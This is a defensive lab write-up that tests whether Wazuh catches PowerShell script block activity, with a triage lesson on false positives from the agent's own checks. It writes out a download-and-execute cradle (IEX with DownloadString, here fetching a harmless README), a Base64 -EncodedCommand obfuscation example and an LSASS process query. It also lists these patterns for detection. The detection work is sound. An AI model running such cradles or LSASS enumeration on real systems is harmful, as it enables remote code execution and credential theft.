## Detection

Three PowerShell commands commonly associated with reconnaissance and defense-evasion behavior were executed locally on the victim host, in order to test whether the Wazuh agent could capture and analyze full PowerShell script block content (not just the fact that `powershell.exe` ran).

- **Detection mechanism:** PowerShell Script Block Logging (Event ID 4104), ingested via a custom `<localfile>` entry added to the Wazuh agent configuration (`Microsoft-Windows-PowerShell/Operational` channel), which is **not enabled by default** in the stock Wazuh Windows agent config.
- **Rule triggered by the test:** 91815 — *"Powershell executing process discovery"*

## Commands Executed (Test Set)

1. **Base64-encoded command** (classic obfuscation/evasion pattern):
   ```
   powershell.exe -EncodedCommand "RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=="
   ```
   Decoded and logged by Wazuh in plaintext as: `Get-Process`

2. **Download cradle** (classic "download and execute" pattern):
   ```
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShell/PowerShell/master/README.md')
   ```
   Retrieved a benign Markdown file from GitHub and attempted to execute its content as PowerShell, which failed with parser errors (the file is not valid PowerShell syntax). The command still triggered network activity and an `IEX`/`DownloadString` pattern.

3. **LSASS process query** (reconnaissance step commonly preceding credential-dumping techniques):
   ```
   Get-Process | Where-Object {$_.ProcessName -like "*lsass*"}
   ```

## Analysis

**Confirmed finding:** the `-EncodedCommand` invocation of `Get-Process` was correctly captured, decoded, and logged by Windows PowerShell Script Block Logging, and matched against Wazuh rule 91815 with an accurate MITRE ATT&CK mapping (T1057 — Process Discovery). This demonstrates that Base64 obfuscation does **not** defeat detection once Script Block Logging is enabled, since Windows decodes and logs the final executed command regardless of how it was encoded on the command line.

**False-positive triage note (important):** of the 9 total Event ID 4104 hits observed in the same time window, 8 were matched to rule 91816 (*"Powershell script querying system environment variables"*), all with an identical `scriptBlockText`:

```
secedit /export /cfg $env:TEMP\secpol.cfg; Get-Content $env:TEMP\secpol.cfg | Select-String MinimumPasswordLength; Remove-Item $env:TEMP\secpol.cfg
```

This command was **not** executed as part of the manual test set described above. Based on timing and content, it is attributed to the Wazuh agent's own **Security Configuration Assessment (SCA)** module, which runs periodic PowerShell-based policy checks (including password policy, via `secedit`) as part of its normal operation. It coincidentally fired in the same 30-second window as the manual test, which could easily be misread as 8 additional attacker-driven events if not investigated closely.

This is a useful, realistic SOC lesson: **volume of alerts is not the same as volume of malicious activity**, and an analyst must always inspect the actual `scriptBlockText` (or equivalent raw evidence) before attributing events to an attacker, rather than relying on alert counts or rule descriptions alone.

The `IEX`/`DownloadString` command and the LSASS process query did not appear as separate, clearly attributable Event ID 4104 entries in this test window — likely due to how PowerShell splits/batches script block logging for short or failed expressions. This is noted as a gap for further investigation (see Recommended Actions).

## Recommended Actions

1. Keep PowerShell Script Block Logging permanently enabled on all monitored endpoints — it proved effective at decoding obfuscated commands.
2. Additionally enable **PowerShell Module Logging** and **Transcription**, which would provide further context (e.g., which modules were loaded) and may help capture the `IEX`/download-cradle and LSASS-query events that were not clearly matched to a rule in this test.
3. Create or tune a custom Wazuh rule to specifically flag `IEX`, `DownloadString`, `Net.WebClient`, and `-EncodedCommand` patterns in `scriptBlockText`, independent of whether they resolve to a "process discovery" style rule.
4. Establish a baseline for the Wazuh SCA module's own expected PowerShell activity (e.g., `secedit` policy checks) so analysts can quickly distinguish agent-generated telemetry from attacker-generated telemetry during triage.
5. Monitor for process lineage (parent/child process) around `lsass.exe` queries, since repeated or scripted enumeration of LSASS is a precursor to credential dumping tools such as Mimikatz.

## Lessons Learned (Lab Notes)

- The stock Wazuh Windows agent configuration does **not** monitor the `Microsoft-Windows-PowerShell/Operational` event channel by default; it had to be added manually via a `<localfile>` block in `ossec.conf`, followed by a `WazuhSvc` service restart.
- Registry-based PowerShell logging policies (`EnableScriptBlockLogging`) take effect only for **new** PowerShell processes started after the change; previously running or already-executed commands are not retroactively logged.
- Not every alert in a "suspicious PowerShell" time window is necessarily attacker-driven — the Wazuh agent's own SCA module generates its own PowerShell-based telemetry, which must be excluded during analysis to avoid inflating the perceived scope of an incident.
